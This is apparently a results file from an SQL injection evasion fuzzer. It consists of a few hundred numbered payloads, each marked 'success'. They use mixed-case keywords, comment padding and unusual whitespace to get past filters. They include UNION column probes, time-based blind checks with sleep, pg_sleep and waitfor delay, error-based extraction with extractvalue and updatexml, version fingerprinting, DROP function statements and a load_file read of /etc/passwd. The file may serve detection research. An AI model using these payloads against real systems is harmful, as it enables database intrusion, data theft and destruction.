1 success '-8159 WheRe 2793  =  2793 AND True union all sEleCT 2793,2793,2793,2793,2793# '
22 success "sElEcT pg_sleep /**/(  0x5  )   anD    (    (   'vxxg'   LIkE\t  'vxxg "
24 success '-2378" where 2686   like \t/*oU3o^*/(SELECT 2686) || 6872 /*T*/=  6872-- !kO&'
25 success "-4330'/**/union all sElECT/**/3059,3059,3059,3059,3059,3059,3059,3059,3059-- "
27 success 'iif  (  1878   LIKE   2513,0x1,1/0  )   '
29 success 'end and    (\x0b   (   3848 IN (3847,3848,3849) OR False '
30 success "-6220'\x0bunion all SeLECt/**/1462,(SELECT 1462)# "
34 success '-4543"  )   OR 479 IN (478,479,480) '
36 success '0x1" where\x0c9889   like /**/ 9889 '
41 success ' SELECt * fRom users WHeRE id  =  0x1 Or ".  )  " Or 1  =  1 -- 1 ~y'
42 success "0x1'||  ( /*MW X*/select 'svnn' froM dual WHErE 8710 \x0b like \n 8710 AND/**/1 AND 0x228b IN (8842,8843,8844)/**/"
47 success '0x1,  (  SEleCt   (  CAsE WHEn   (  5433 /*Y,*/ Like   5433  )   THeN 1 eLSE\tcast  (  1 aS int  )  /  (  SElect 0 FROM dual  )   End  )   from/*MR,!*/dual  )   '
48 success 'SelECt   (  cAsE WhEn   (  9393   lIke   0x159a  )   ThEN 9393 elsE cast  (  1 as int  )  /  (  SeLECT (selEct 0) from dual  )   enD  )   fRoM dual-- '
49 success 'SELect   (  CASe WHeN   (  8993  =  8846  )   tHen 8993 ELse 8993*  (  seLeCt 8993 FRoM mysql.db  )   END  )  # '
55 success '-9541/*P*/ )   As bnky whEre 3934 \x0b LIKE  /**/(SElECt 0xf5e)\tunion all sElEct 0xf5e,3934,3934# Z}}='
57 success '0x1  )  /*m{F*/OR   (  selecT 2*  (  iF   (    (   SeLecT * frOm   (  sELEct concat  (  0x7171706a71,  (  SELECt   (  elt  (  7308 Like 7308,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 0x7538dcfb7617fffa   )    )     )   ANd   (  4082 lIke 4082 '
61 success " OR 'something'    liKE \x0c\x0b 'some'+'thing' "
67 success "-1256' iN/*;y$bA*/boolean mode  )   union/**/all seleCT 7889,7889,7889,7889,7889,7889,7889,7889,7889-- I`"
69 success '0x1  )\x0c  aND\x0celt  (  0x1d01   LIke   8842,8842  )   &&  \x0b( \t424 iN (423,424,425)\tand True/**/oR 0 '
71 success ' SElECT * FROm users wheRE id   LIkE   1 OR 1#"? union seLEcT null,version  (    )\t  -- 1 '
74 success "-9574'  )   As rxym WhErE 4423 NOT LIKE 4424 union all sElecT 4719,4719,4719,4719,4719,4719,4719-- ?`"
80 success '0x1 order by\x0b0x1-- '
82 success "0x1'+  (  sELeCT iutk WhERE 307 IN (306,307,308) "
85 success ' SElEct * frOm users WHEre id/**/ =  1 Or 1#"(sELeCT 1) union SElEcT \'a\',version  (    )   -- 1 b'
86 success '-0x26a3"/*+#tQV*/union all SElEcT (sELECt 7489)# fL'
88 success "1'/**/where 678/**/like 678 order by 1-- "
89 success '0x1  )   wHeRE 4992  =  4992 aNd True '
91 success 'iF  (  3593   LIKE   3779  )   sEleCT 3593 eLSE DROp function qtqy-- '
96 success ' selEct * fRom users wheRe id  =  1\xa0OR 1#"{ union sELecT null,version  (    )   -- 1 '
97 success '-9356 oR elt  (  1032  =  1032,3623  )  -- izgi '
101 success '1 WHere 2060\x0b /**/LIke  \xa00x80c '
102 success "1'\x0cwhere/**/'uJS'!='uJSw' "
106 success '-1447"/*\x0c0*/union all sELECT 3013,3013,3013,3013,3013,0xbc5,0xbc5-- '
108 success "-4828'+  (  SELect qxnw WHERe 6208 LIKE 6208 union all seLEcT 9488,9488-- K}"
112 success '0x1" order by/**/1#\tl'
113 success '-0x817 union all select/**/4753,4753-- '
114 success "1'/**/WHerE 5230  =  5230 AND 8800 LIKE 8800 OR 2812 NOT IN (2811,2812,2813) AND 0x1bd6!=7127 "
118 success "Select count  (  *  )   FroM sysibm.systables aS t1,sysibm.systables aS t2,sysibm.systables As t3 anD    (    (     (  'vcgc' liKe 'vcgc "
135 success 'SElECT count  (  *  )   From domain.domains As t1,domain.columns aS t2,domain.tables AS t3# kuqm '
137 success ' having/**/1  =  1 OR 0-- '
143 success "-5528'\xa0 )   union all sELeCT 5153,5153,5153,5153,5153,5153,5153,5153,5153# R4"
148 success 'seLecT * FROm\tgenerate_series  (  9058,9058,CAsE wHEn   (  9058   LikE /**/ 1183  ) \n ThEN 1 eLSE (sELeCt 0) ENd  )   limit 1-- Hj'
149 success "0x1'+  (  select/**/mkbv where/*{BD.*/'|)dj<'!='|)dj<<' and 0x2426  =    (  select count  (  *  ) /**/ from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as/**/t4  )  -- *'^"
162 success '||/**/0x1 /**/ like   0x1/*\x0b'
168 success '0x1" WHeRE\xa09815 NOT LIKE 9816 && 1/**/'
171 success " Or userid liKE '% "
183 success 'seleCT CaSE WhEn 5559\t  lIkE   3483 tHEN 1 elSe null enD-- '
194 success ' sElECT * FroM users wHeRe id   LiKE   0x1 <@. union sELECt 0x1,version  (    )   -- 1 Oz'
196 success "0x1'\tunion all\x0bselect/*\\sRrv*/null,null,null,null,null,null,null,null# "
199 success "sELect * FrOM users WherE/**/id  =  1 or \\<   =  1 OR 'n'='n' -- 1 "
203 success ' (  8266  =  8266 OR 4823 NOT LIKE 4823  )  *9900 '
207 success '1 wHere 2629 NOT LIKE 2630 Or   (\x0b sELeCt 9173 FROm  (  SElecT count  (  *  )  ,concat  (  0x7171706a71,  (  seLeCT   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x From information_schema.character_sets group by x  )  a  )  -- '
209 success '1" wHEre 2642   lIKE   2642 && True Or 0x207b  =    (  sELEcT count  (  *  )   FROM sysibm.systables AS t1,sysibm.systables As t2,sysibm.systables aS\nt3  )  -- '
211 success ' End aND "%"  =  " '
212 success "1'+  ( \nSelEcT yjyp Where 9696   LIKE   9696 "
222 success "0x1' where 0xa65  =  0xa65 "
223 success "-4373'+\t (  select 'rlht' WHere 'rG' LIKE 'rG' && 3458 LIKE 3458 union all sElECT 2285,2285,2285# "
226 success "1'/**/in\nboolean mode  )   && 5725   LIKE   5552#\t6"
227 success "seLect * FROm users wHERE id  =  1/*,*/+   (  \\+  )   OR 'oak'='oak' OR 'LX-'='LX-l' OR 0 aNd '&'<>'&b' -- (SELECT 1) "
228 success "1'\tWHErE 4945  =  4945 AND (SELECT 2292)<>2293 "
230 success ' (  SElEcT   (  cAsE WHEn   (  1570   LIKE   6977 /**/)   theN 1/**/elSE 0x622*  (  seLEcT 1570/**/fRom mysql.db  ) \x0b eNd   )    )  '
237 success '1 union/*dQ=&$*/all seLEct null,null,null,null,null,null,null,null# '
242 success 'SeLECT/**/pg_sleep  (  0x5  )  \xa0ANd "%"   LIKE   " '
246 success 'SelEct sleep  (  5  )   AND    (    (   8347 NOT LIKE 8348 AND True OR/**/0 '
249 success '0x1 WHEre 0xa59  =  0xa59 ||   (  SEleCT * FrOm   ( \nselECT  (\n/**/sleep /*|*/(  5   )    )     )  ydpu  )  -- Oq]X'
254 success "0x1' WHeRE 3516 NOT\x0bLIKE 3517 aNd 3662=0xe4e Or 8466   lIKe   benchmark  (  5000000,md5  (  0x694a4745   )   /**/)   -- u"
255 success ' selECt * froM users wHeRE id   LIkE   \'(SELECT 1)\' union sELECT $["],@@VERSION -- 0x1\' '
256 success 'selECT\x0b* frOm information_schema.tables-- (['
259 success 'selEcT   (  cASe wHEN   (  0x1648   Like   4125  )   THen 5704 elSe cast  (  1 AS int  )  /  (  SeLEcT 0 frOm dual  )   ENd  )   frOM dual--/**/'
262 success "-0x14ec'\n )   oR 9323\t  lIkE   9323# (q"
269 success ' SelECT * fRom users WHeRe id  =  0x1 OR "1{" or \'w\'!=\'wy\' -- 1 c'
275 success 'declare @s varchar  (\x0c 22\x0c )   SeLecT @s   =  '
282 success "0x1' and elt/**//**/(  7769<>7770 OR '7U'!='7U',7259  )   "
284 success '-1084 WHerE 1181  =  1181 oR make_set  (  8540 NOT LIKE 8541,7185  )  -- $\xa0'
289 success "1'+  ( /**/select dyfw where\xa09741=9741 AND True AND True OR 5045=5046 and (SELECT 0x20d7)  =\x0b   (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +' "
295 success "0x1' aND\x0cupdatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  sELECT  /**/(  elt  (  5916 NOT LIKE 5917 AND 8481=8481,1   )    )     )  ,0x717a767a71  )  ,0x489  )   "
297 success '-2453"  )  \x0cunion/**/all SELEct 4520,4520,4520,4520,4520,4520,4520,0x11a8,4520,4520-- 6'
303 success ' sELeCt * fROM users WHERE id  =  1 || 1#"$ union selEcT \'a\',version  (    )   -- 1 '
305 success "selecT * FrOM users wHErE id   lIKE   '1'/**/oR $<\\ oR (sELECt 1)   LiKE   (sElecT 1) -- 1' D"
306 success '0x1"  )\x0c  WHere 0x2420   LIKE /**/ 0x2420 '
310 success ' ENd aNd    (/**/   (     (  "memh" lIKe "memh '
311 success ' sELecT * fROM users wHerE id  =  0x1 oR ";#" Or 0x1  =  1 -- 1 '
313 success "1'+  (  seLecT taga\x0bwhErE 8036  =  8036 oR 0 OR 700 not like 700 "
316 success ' (  SeLecT   (  CasE wHEn   (  6035   like   9882  )   ThEn 6035 ElSe 0x1793*  (  SeLECt 6035/**/FROM mysql.db  )   End   )    )  '
318 success "1'+/**/ (  sElECT\ngqez wHERE 3704/*B*/  Like   3704 "
319 success '-0x1cf8" wheRe 7656 /**/ likE   7656 order by\t1-- HV'
321 success '0x1  )   WhERE 0x15fd   liKe   0x15fd '
322 success 'IF  (  3392   lIkE   4422 \x0c)   SeLEcT 3392 ElSe dRop function xsqq--/**/'
324 success '-5520%" union/**/all SELeCt/**/5235,5235,5235,5235,5235,5235,5235,5235,5235,5235-- '
328 success '-3130  )   union all SelECt 1741,1741,1741,1741,1741,1741,1741,0x6cd# '
332 success "-9393' where 3119 /*<ouH*/=  3119 or 'Iu' NOT LIKE 'IuI'-- i<Zl"
335 success "/*\\*/union SELECT\x0c1,load_file/*%2*/ (\x0b '/etc/passwd'  )  ,1,1,1;\x0b"
336 success '0x1 OR 8466  =  benchmark  (  0x4c4b40,md5  (  0x694a4745/**/  )    )  \t# irvm !G6'
337 success "-2855'/**/union all SELEcT 2495,2495,2495,2495,2495,2495,2495,2495,2495--\x0b"
338 success '-8629 WhErE 8049   LIKE   8049 union all sElEcT 8049,8049,8049,8049,0x1f71,8049,8049# _P'
346 success '0x1%" aNd 2805 \n LiKE /**/ 1345 '
352 success '%27\xa0Or\xa00x1   like   0x1 '
359 success "1'+  (  SelEcT oogh whErE 1167   like \x0b 1167 AND True OR elt  (  5873   like   5873,sleep  (  5   )    )   # "
361 success 'iif  (  0xeb0   like   0x12b1,1,1/0x0  ) \x0b '
365 success "-5386'\x0b/**n|0*/)   union all SeLeCT 8026,8026,8026,8026,8026,8026# "
366 success '-4165" wHERe 1772   LIKe   1772 union\xa0all SeLECT 1772,1772,1772,1772,1772,1772,1772,1772-- '
367 success ' ( \x0bSeLeCt   (  CaSE whEn   (  1421   LIkE   1421  )   THEn 1 else 1421*  (  seLECt 1421 from master..sysdatabases  )   EnD   )   /**/)  '
376 success "0x1' anD 0xa9c\x0b  LIKE     (  SeleCt count  (  *  )   From sysusers aS sys1,sysusers As sys2,sysusers as sys3,sysusers As sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  -- (WPQZ"
378 success 'sEleCt   (  CAse WHeN   (  7217   LIKE   7631  )   theN\x0b7217 elSe 7217*  (  SeLECt 7217 FrOM information_schema.character_sets  )   eNd  )  # @p'
379 success "SElect * frOM users WHERe id  =  '0x1' *$\t1 or 1  =  1 -- 0x1' c"
380 success "1'\x0c  )    )    As lizu wheRe 9113 LIKE 9113 AND 3054 LIKE 3054 Or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  LEFt  ( \ncrypt_key  (  char  (  65/**/ )   oR char  (  69  )\xa0 ||char  (  83 /**/)  ,null  )  ,0  )  ,500000000  )  ,null  )  -- "
384 success '0x1  )   as lisg/*}fC*/WHeRe 5490\x0c =  0x1572 '
389 success 'waitfor/**/delay \'0:0:5\' ANd   (  "dmcu"\t  like   "dmcu\n'
390 success "(seleCT 0x1)%'/**/union/**/all SelECT null,null,null,null,null,null,null,null,null,null#\nF\\F!c"
394 success "0x1'+  (  select 'vabj' WHere 7178   LIKE   7178 union/**/all SelECt/**/null,null,null,null,null# [u"
397 success "0x1,  (  seleCT   (  CAsE WheN   (  3902   LiKe   3902 or 'VFC'='VFCI'  )   ThEn   (  SElecT count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   ElsE 1/  (  sElEct 0 fROM dual  )   End  )   FroM dual  )   "
406 success "1'+  (  SELECt dgnt wHEre 4701   LikE   4701 Or 0 OR/*i)*/7427   LIKe /**/ dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )   OR chr  (  90  )  ||chr  (  109  )  ,(seleCT 5)  )  -- "
409 success 'iif  (  0x485   lIke   4542,1,0x1/0  )   '
412 success "SeLeCt pg_sleep  (  5/**/ )   && 'zfyy'   LiKe   'zfyy "
415 success 'SELecT   (  case WheN   (  4061   LIKE   1396  )   ThEN 4061 eLSE 1/  (  selecT 0  )   EnD  )  -- '
416 success "-9509'  )   whERE 9303  =  9303 OR 7487 LIKE 7488/**/&& 1 order by 1#\t"
423 success 'iif/**/ ( /*\\;*/8354/**/ =  3515,1,1/0/**/ )  \x0c'
434 success 'SElEcT CASE WHEn\x0b9390   LIKE   5752\x0btHen 0x1 ELSE null end-- ,.'
438 success "0x1'\t\t)  \nas chla where/**/6098\t  like  \t6098 OR 0 "
440 success 'sELect count  (  *  )   fROM domain.domains As t1,domain.columns As t2,domain.tables aS t3 &&    ( \t  (   "vqpx" LiKe "vqpx '
442 success 'SELeCT   (  cASe wHEn   (/**/ 9986  =  8342  )   thEn 9986 ElSe 9986* \t(  seLECt 9986 FroM information_schema.character_sets  )   ENd  )  # r'
444 success "0x1'  )   AND 8353=8353 oR\n0x1a66 NOT LIKE 6758 "
448 success '0x1 WHErE 2292  =  2292 union all SELecT/*AE/*/null,null,null,null#  lIke jM'
451 success "-7868'\x0bin boolean mode  )   union/**/all select 5117,5117,(SELECT 5117),5117,5117,5117,5117,5117,5117# MQi$"
452 success ' SelECT sleep  (  5/*hh*/ )   and "%"  =  " '
453 success "-4205'/**/union all SelEct 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986#\xa0gd"
455 success 'SelECt   (  casE wHeN   (  7254   liKe   5901  )   ThEN 1 ElSe (SelEct 7254)*  (  sElecT 7254 fROM master..sysdatabases  )   ENd  )  -- '
460 success "-6368'\nunion/**/all\tselect\xa06529,6529,0x1981-- iM\x0b~"
465 success "0x1'+  (  select fhbk where 8133<>8134 AND True OR False OR 'M' NOT LIKE 'M' and\x0c0x15b4  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +' "
466 success "-2569'\x0bunion/**/all SeLeCt\x0b(SELECT\x0c4484)-- "
467 success '0x1" WHERe 7307!=0x1c8c OR 4915 \n LIke     (  selecT count  (  *  )   FROM domain.domains aS t1,domain.columns aS t2,domain.tables aS t3  )  -- '
470 success 'seLeCT caSE/**/WHEN 0x1f0f   like   1147 tHEN 1 ElsE null enD-- (SELECT 7)'
477 success "-7371'  )   union/*G*/all SelEct 4531,4531,4531#\xa0"
478 success '-4191\x0b )   order by 0x1#\xa0A\\'
482 success 'sELEcT count  (  *  )   FROm domain.domains As t1,domain.columns AS t2,domain.tables\nAS t3 and    (    (     (  "%"   LIkE   " '
486 success "-4480'  )   WherE 5833 IN (5832,5833,5834) Or 0 oR 1570  =  convert  (/**/ int,  (  selEcT char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  SElECT   (  casE\xa0wHEn\n  (  1570  =  1570  )   TheN char  (  49  )   eLsE char  (  48  )   END   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- \r"
488 success '1" wHErE 3648<>3649 aND 4759 LiKe 4759 OR 5171 NOT\nLIKE 5171 anD elt  (  (SElEct 1210)   lIke   (SELecT (SeLeCT 0x4ba)),sleep \n(  5   )    )   -- '
490 success ' SElecT * FROM/**/users Where id  =  1 or "{." Or 543!=544 --\xa01 oR'
494 success '0x1"/**/where 7110 \x0b like   7110 '
496 success '-1591 where 3291   LIKE\n  0xcdb/**/union all select 3291,3291,3291,3291,3291,3291,3291,0xcdb,3291# '
497 success '0x1 WHerE (SElECt 7158)   LIKE   0x1bf6/*V*/|| elt  (  5398 IN (5397,5398,5399),sleep  (  (SELECT 5)   )    )   # '
498 success "seleCT * fROM users wHErE id  =  1 +  (  0x1  )   oR '{3Z'='{3Z' OR '*BOg' lIKe '*BOg7' -- 1 "
499 success "oR 'something'   =   'some'+'thing' "
501 success '0x1 /*Rcx*/ )    )    As shmg wHErE 89 lIKE 89 ANd True aNd 3980 NOT LIKE 3981/**/union all sELECt null,null,null,null,null,null,null,null,null,null# '
502 success '-0x1bc7%" union all/**/seLEct\x0b6083,6083,6083,6083,6083,6083--\x0b'
503 success '-8633" or 5099   like   5974\x0b'
504 success '-5803  )   wherE 8651  =  8651 OR 3443 NOT IN (3442,3443,3444) OR 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sElECt   (  CAsE WHen   (  4493  =  4493  )   then 1 eLsE 0 enD  )   FRom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  ( \t122  )  ||chr  (  113   )    )   -- '
505 success '-0x1fcf/**/union\nall/**/sElEct 4492,4492,4492,4492,4492,4492,4492,4492,(seLeCT 4492)# '
506 success 'SElEcT * FrOm generate_series  (  1488,0x5d0,CAsE WHEn   (  1488  =  1685  )   ThEN 1\x0bELSE/**/0 EnD /**/)   limit 1-- '
507 success 'SElEct   (  CasE WHeN \n (/*X*/ 4043   likE   0x149c  )   tHeN 4043 ElSE 4043*  (  sElecT 4043 frOM information_schema.character_sets  )   end  ) \n# '
509 success '0x1 union all sELEct null,null,null,null,null,null,null,null,null# O'
513 success '-2211" or/**/2113  =  8885#\x0c'
514 success "1'+  (  sElECT hett Where 7228  =  (Select 7228) "
517 success "-5708 where 3134  =  3134 AND True or 0x170f   LIKE     (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  -- "
518 success 'SElECT   ( \xa0cAsE WHeN\x0b  (  9299   LIKE   2760  )   theN 1 eLSe 9299*  (  SelEcT 9299 fROM master..sysdatabases  )   End  )  -- '
523 success "1'\t )   WherE 0xcbe   LIKE   3262 ANd True union all/**/SELecT null,null,null,null,null,null,null,null,null,null# LD|"
526 success "-6550'  )   wHERE 9257 LiKe 9257 ANd True aNd (SELEct 1947) NOT LIKE 1948 or 0 or False union all/**/seLecT 1675,1675,1675,1675,0x68b,1675,1675-- "
527 success " (  selECT\t* frOm   (/*J&WiI*/ sElEct  (  sleep  (  5   )    )    /**/)  srmq  )   AND    (/*N*/   (   'cbaj'   lIkE   'cbaj "
532 success 'sELECt   (  CASE wHEn   (  6804   LIkE   7050  )   ThEN 6804 else cast  (  1 aS int\x0c )  /  (  seLecT 0 From dual  )   eNd  )   fROM dual-- '
534 success "-6906' where/**/'`' NOT LIKE '`C'/**/union/*w*/all SElect 1839,1839,1839,0x72f,1839-- df"
537 success 'SeLEcT   (  CAsE wheN   (  7645   LIke   5921 /**/)   ThEN 7645 elSE 7645*  (  SElecT 7645 fRoM information_schema.character_sets  )   end  )  # ^X'
540 success '1 uni/*<f?d`*/ON sElEcT all FroM Where '
541 success "0x1  )   WherE 'p\x0b_w'<>'p\x0b_wL'\xa0Or 'uS.v'<>'uS.v'/**/"
543 success '-1653 union all selECT\x0b8415,8415,8415,8415,8415,8415,8415,8415# '
544 success "1'+  (  select 'opqr'\xa0Where 2442 \t=  2442 AnD 587 LIKe 587 oR 1022   like     (  SeLEct count \x0b(  *  )  /**/frOM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- "
547 success ' sEleCT * FRom\tusers WHeRe id   LIke  /**/1 union sELECT @ 1a,version  (    )   -- 1\x0b'
554 success "seLect count  (  *  )   frOm domain.domains aS t1,domain.columns aS t2,domain.tables AS t3 ANd    (    (   'wusq'   LIkE   'wusq "
561 success ' sEleCt * FROM users whEre id \x0b=  0x1 oR  @$#  =  (SELECT 1) union select 1,version  (    )/**/  -- 1/**/'
566 success '(SElecT 0x1)" WhERE 4607 NOT LIKE 4608 '
568 success "-6639'  )   aS trll WHerE 3851 lIke 3851 aNd True || False union all/**/SeLeCT 6271,6271,6271#\x0cue.P"
569 success ' sElECt * FrOM users wheRe id  =  1 Or @#"  (   /**/ likE   1 OR 1  =  1 and True -- 1 '
570 success 'sEleCt   (  cAse When   (  3539   likE   8768  ) \xa0 THeN 3539 ELsE cast  (  1 As int  )  /  (  SELECt 0 FroM/**/dual  )   enD  )   fROM dual-- '
575 success 'if  (  4735   LIKE   8907  )   select 4735 else drop/*ODy*/function qigo-- g'
577 success "1'/**/whEre 1628\xa0  like   1628 "
583 success "-9145'\x0b )   As xyya whEre 8950   liKE /*fw*/ 8950 union all seLECT 8950,8950,8950,8950,8950,8950,8950,8950-- "
586 success '-5425\twhere 5933  =\x0b/*ub\\qv*/5933 union all/**/select 5933,5933,5933-- ~'
589 success '-3250%"/**/union\x0ball SELeCt 0x1bfa,7162,7162,0x1bfa,7162,7162,0x1bfa,7162,7162-- :[]z'
590 success "1'+  (  select 'ohdf'\tWheRE 2201=2201 and True ANd 0x162e  =  3277-- CS"
600 success "sElEct count/*?*/ (  *  )   frOm generate_series  (  1,5000000  )   and    (    (   \xa0 (  'xori' liKE 'xori "
605 success ' (  374=374 && sleep  (  5/*7]S*/  )    )  '
608 success '-7006\'/*\r8G*/where\n\'m"\'=\'m"\' OR 0 union all seLEct 6966,6966,6966,6966# Dw'
614 success '0x1 rlike\t  (  sElEct * fRom  /**/(  SeLect \x0c(  sleep  (  0x5   )    )     )  sgvo  )  # ewsz <#'
616 success '1 union/**/all SElECt null,null,null,null,null,null#\t'
620 success " SEleCt * frOm users WHEre id   LikE   '0x1'\tunion/**/SELeCt +\\.,@@VERSION -- 1' "
621 success '-4045 union all/**/select 6857,6857,6857,0x1ac9,6857,6857,6857--/**/'
622 success 'oR 3999 IN (3998,3999,4000) AND 1 /* '
624 success '0x1"  )\x0c  As aifd WhERE 0x174a   like   0x174a/*B*/'
628 success ' OR/*lG\tPL*/1  =  1 OR ""  =\x0b  '
629 success 'sElEct   (  CAsE WHEN   (  4297  =  9086  )   Then 4297 else 0x1/  (  SeLEcT 0/**/ )   ENd  )  --\x0b'
634 success '0x1" wHeRe 9521   liKE   0x2531 or   (  selecT * from   (  selecT  (  sleep  (  5   )    )     )  ydpu  )  -- Ml'
635 success "-0x22b1%'\nunion all/**/SELeCt 8420,8420,8420,8420,8420,8420,8420# "
637 success "1'/**/in boolean mode  )   waitfor delay/**/'0:0:5'-- '16"
639 success "0x1'+  (  SElecT mrdi WherE 7451  =  7451 ANd True anD 1 && 8594  =    (  sElEct 8594 FROm pg_sleep  (  5   )    )   -- V"
645 success ' SELECt * fRoM users wheRE id  =  1 Or ".@" OR 1  =  1 -- 1 -!c'
646 success 'iF  (  0x205c  =  6171  )   selEct 8284 ElSE dROP function mbih-- H'
651 success '0x1  )   WhERE 1270   LIKE   1270 OR False OR   (  sELect 9173 FRom  (  seLEcT count  (  *  )  ,concat \x0c(  0x7171706a71,  (  seLECt   (  elt  (  9593 LIKE 9593,1   )   /**/)     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x FRom information_schema.character_sets group by x  )  a  )  -- Kw'
654 success '0x1" WHErE 0x208d\t/*-*/ like   0x208d '
655 success "selECt liKe/**/ (  'abcdefg',upper  (  hex  (  randomblob  (  (SELECT 500000000)/(sELeCT 0x2)   )    ) \t    )    )    "
658 success "0x1' WHERE 9267 NOT LIKE 9268\x0bunion all sElEcT null,null,null-- ]"
661 success "1'+  (  sELeCt ukwc wHeRe 33!=34 aNd 5652<>5653 or   (  sELeCt * FroM /**/ (  seLecT  (  sleep  (  0x5  /**/)    )     )  sddo  )  # *"
665 success "0x1  )   AS odqn wHERE '0x9' NOT LIKE\xa0'0x9=' "
668 success '-2658  )   as casi WHere 7364/**/ =/**/ 7364 OR 8245  =  9651-- ZI'
670 success "-1272' Or 0x1\ngroup by concat  (  0x7171706a71,  (  sELeCt   (  CAsE wHen   (  4232   like   4232 OR False OR 0 AnD 9525<>9526  )   thEn 1 ElsE 0 eND   )    )   ,0x717a767a71,floor  (  rand  (  0  ) /**/*2   )    )    having mIn \x0b(  0  )  # "
673 success 'SeLecT   (  Case wHEN   (  7033 \x0c=  1594  )   ThEN 7033 Else 7033*  (  SELEct 0x1b79\x0bfROm information_schema.character_sets  )   END  )  # '
674 success '0x1"  )   as/**/semi WheRe 4260   LIKE   4260 and True OR 0 anD 1 && True AND 0x1 '
684 success '0x1"  )   aS ffon whERe 2738   likE   2738 AND 3754  =    (  seleCt upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  SElecT   (  casE when   (  3754  =  3754  )   thEN 1 ElsE 0 ENd /**/)   FrOm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113\x0c )  ||chr  (  62   )    )     )   from dual  )  -- '
686 success '0x1 Or (sELECt 4411)   LIKe     (  seleCT count  (  *  )   FROm sysusers aS sys1,sysusers AS sys2,sysusers\x0caS sys3,sysusers as sys4,sysusers as sys5,sysusers AS/**/sys6,sysusers As/**/sys7 \xa0)  -- ctdx q'
689 success ' seLect * FRom users wheRe id  =  1.*1 union SElEct 1,banner From v$version wHEre\trownum  = \xa01 -- 1 '
690 success '-3420\nwhERe 9681  =  0x25d1/**/or make_set  (  2438  =  1977,1977  )  -- '
691 success ' union   (  SElect NULL, NULL, \n (  sELEct @@version   )    )    -- +J'
693 success "waitfor delay/**/'0x0:0:5' and 'gsvt'\xa0  LIKE   'gsvt "
694 success "-5008'/**/union all/**/SELecT 1942,1942,1942,1942,1942,1942,1942,(sElECt 1942)-- 9+"
695 success ' seleCt * FRoM users WHEre id   LiKe   1 or "._" Or 0x1/*/TP3*/ =  1 -- 1 '
701 success "-0x2671 where\n'tXu' NOT LIKE 'tXuK'/**/union all select 4612-- "
708 success '0x1"  )   WHeRE 4112  =  4112 oR False AND \'N+\'\tNOT LIKE \'N+N\' '
713 success '-7971   )    )    aS armw wHERe 9474/**/ =  9474 OR 2261<>2261 oR 4973\nNOT in ((SELECT 4972),4973,4974) Or make_set  (  9354  =  9354,7185  )  -- #'
715 success ' seLECT * fROM/**/users whEre id  =/**/\n1 ||/**/(SElEcT 1)#"? oR \'\n<K\' NOT LIKE \'\n<KD\' aNd 2919 iN (2918,2919,0xb68) -- 1 '
720 success ' enD ANd\x0c   (    (   "dmgj"  =  "dmgj '
721 success "0x1',extractvalue/**/ (  0x263c,concat  (/*C*\r*/ 0x5c,0x7171706a71,  (  seLect   (  elt  (  0x263c   lIke   0x263c,0x1   )    )     )  ,0x717a767a71   )    )    "
722 success "1'+/**/ (  select nash where 2150 LIKE 2150 AND 1065 LIKE 1065 union all select null# "
726 success "1'/**/where 174 IN (173,174,175) "
727 success 'selEct   (  CASE WhEn   ( \t5418/**/ =  6516  )   ThEN 1 ElSe 5418*  (  SElect 0x152a FRoM master..sysdatabases  )   eNd  )  -- B?'
730 success '-0x5cf"  )   AS crfi WherE 9927 IN (9926,9927,9928)/**/union all/*{"*/SElEcT\t2407,2407,2407,2407,2407,2407,2407,2407,2407,2407-- '
741 success '1/**/where 2561 NOT LIKE 2562 AND True '
743 success "-2817  )   wHEre 'fl' NOT LIKE 'flv' Or 3266  =\xa0 1102 "
746 success 'sElEct cAse wHEN 3661   LIkE   9315 THen\n(SeLeCt (selEcT 1)) elSE null ENd-- '
749 success '0x1  )   where\n9344   like   9344 '
754 success "-2120'  )   OR 8734   like   8844# "
761 success '0x1" WheRe 0x1c7a   LIKE   7290 union all/**/sElEct null,null,null,null,null,null,null-- '
762 success ' SElEct * fRoM users WherE id  =  1 || "  (  _"\tOr 1   LiKE   (SeLecT 1) -- 1 '
774 success 'SelECT   (  CAse whEn /**/ (  3863  =  1151  )   Then 3863 elSE cast  (  1 aS int  )  /  (  seLECT 0 from dual  )   EnD  )   frOm dual-- '
780 success 'iF\n (  1928  /*&a#zP*/likE   0x12cb  )   seLecT (SEleCT 0x788) ELSE DrOp function ucko-- X'
781 success ' (  sEleCt   (  CaSe whEN   (  0x100c   LikE   0x100c or 7085 NOT iN (7084,7085,7086) /*/{+*/)   TheN 1 ElSE 4108*  (  sELEct (sEleCt 4108) From information_schema.character_sets  )   end   )\t   )  '
783 success '-(SELECT 5575)" union/**/all SElecT 8665,8665,8665,8665,8665,8665,8665--/**/.G'
784 success '0x1  )   where/**/4710   like   4710 && True procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840   LIKE   5840  )   then 1 else 0 end \t )    )   ,0x717a767a71   )    )   ,1  )  -- '
